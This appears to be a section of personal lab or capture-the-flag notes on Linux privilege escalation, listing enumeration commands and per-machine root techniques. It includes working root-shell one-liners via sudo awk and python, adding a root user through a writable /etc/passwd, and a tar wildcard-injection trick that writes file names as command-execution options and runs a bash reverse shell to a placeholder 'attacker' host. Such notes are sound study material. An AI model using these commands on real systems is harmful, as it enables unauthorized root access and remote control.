## 🛡️ Privilege Escalation (Machines 61–70)

### Techniques

- Check for `sudo` permissions:
  ```bash
  sudo -l
  ```

- Find SUID binaries:
  ```bash
  find / -perm -4000 -type f 2>/dev/null
  ```

- Check Linux capabilities:
  ```bash
  getcap -r / 2>/dev/null
  ```

- Kernel exploits:
  ```bash
  uname -a
  searchsploit linux kernel <version>
  ```

- Abusing writable scripts:
  - Check for scripts run as root on cron or sudo.
  - Replace the script with a reverse shell or bash.

- Using less known privesc:
  - `LD_PRELOAD`, `LD_LIBRARY_PATH` exploits
  - Abusing NFS mounts or shadow file access

### Real Machine Notes

**Machine 61**
- Found `sudo` permission for `awk`: `sudo awk 'BEGIN {system("/bin/bash")}'`

**Machine 62**
- User is in `docker` group. Escape container using mounted host filesystem.

**Machine 63**
- `python` has `NOPASSWD` on sudo. Spawned root shell with:
  ```bash
  sudo python3 -c 'import pty;pty.spawn("/bin/bash")'
  ```

**Machine 64**
- Found writable `/etc/passwd`. Added root user manually.

**Machine 65**
- Abused custom SUID binary that executes `sh`.

**Machine 66**
- Found cronjob running a script in `/tmp`. Script was writable.

**Machine 67**
- Discovered vulnerable kernel. Used DirtyPipe exploit.

**Machine 68**
- Used getcap to find `/usr/bin/python3` with `cap_setuid` set. Exploited for root.

**Machine 69**
- Found password reuse from user to root in a backup `.bash_history` file.

**Machine 70**
- Used Wildcard Injection in tar via cronjob:
  ```bash
  echo 'bash -i >& /dev/tcp/attacker/4444 0>&1' > shell.sh
  touch "--checkpoint-action=exec=sh shell.sh" "--checkpoint=1"
  tar cf archive.tar *
  ```
